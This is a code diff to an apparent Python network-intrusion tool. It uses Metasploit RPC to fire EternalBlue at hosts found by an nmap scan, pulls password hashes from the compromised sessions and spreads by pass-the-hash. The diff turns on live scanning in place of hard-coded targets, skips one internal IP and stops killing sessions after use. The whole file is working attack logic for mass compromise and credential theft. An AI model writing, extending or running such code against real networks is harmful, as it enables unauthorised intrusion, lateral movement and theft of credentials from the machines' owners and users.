@@ -107,7 +107,6 @@ def passTheHash(ip, localip, hashlist, client):
             return hashes
     return None
     
-
 def eternalBlue(ip, localip, client):
     print('Attempting to exploit ' + str(ip) + ' to gain access to the network...')
     # Load eternal blue exploit
@@ -122,16 +121,20 @@ def eternalBlue(ip, localip, client):
         return hashes
     return None
 
+def maxId(keys):
+    if len(keys) == 0:
+        return 1
+    else:
+        return keys[len(keys) - 1] + 1
+
 def runExploit(client, exploit, payload):
     # Exploit the host
     proc = exploit.execute(payload=payload)
-    jobId = proc.get('job_id') + 1 # add 1 because pymetasploit is horribly written
-    print(str(proc.get('job_id')) + " - " + str(jobId))
+    jobId = maxId(client.sessions.list.keys()) # add 1 because pymetasploit is horribly written
     timeout = 50
     count = 0
     while(jobId not in client.sessions.list.keys() and count < timeout):
-        time.sleep(3)
-        print(client.sessions.list.keys())
+        time.sleep(1)
         count += 1
     if count >= timeout:
         return None
@@ -146,9 +149,7 @@ def runExploit(client, exploit, payload):
             print(output)
         if(':::' in output):
             hashes = gatherHashes(output)
-            client.sessions.session(jobId).kill()
             return hashes
-    client.sessions.session(jobId).kill()
     return None
 
 def getArgs(argv):
@@ -173,25 +174,28 @@ def main():
     args = getArgs(sys.argv)
     if args == None:
         return
-    targets = [ { 'ip': '10.202.208.174', 'osfamily': '', 'osgen': [] }, { 'ip': '10.202.208.190', 'osfamily': '', 'osgen': [] }] #nmScan(args['targetIp'])
+    targets = nmScan(args['targetIp'])
     print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
 
     client = setupRPC()
     # Try to break into machines with eternal blue
     hashes = []
     for i in range(len(targets)):
+        if targets[i].get('ip') == '10.202.208.23':
+            continue
         hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
         if hashData != None:
-            targets.pop(i)
-            hashes = hashData
+            #targets.pop(i)
+            mergeList(hashes, hashData)
             break
 
     if len(hashes) > 0:
-        print(hashes)
         # Found access to network start spidering
         print('Starting hash passing...')
         for i in range(len(targets)):
-            newHashes = passTheHash(targets[i].get('ip', args['localIp'], hashes, client)
+            if targets[i].get('ip') == '10.202.208.23':
+                continue
+            newHashes = passTheHash(targets[i].get('ip'), args['localIp'], hashes, client)
             if newHashes != None:
                 print('Adding ' + str(len(newHashes)) + ' to the hash list')
                 mergeList(hashes, newHashes)
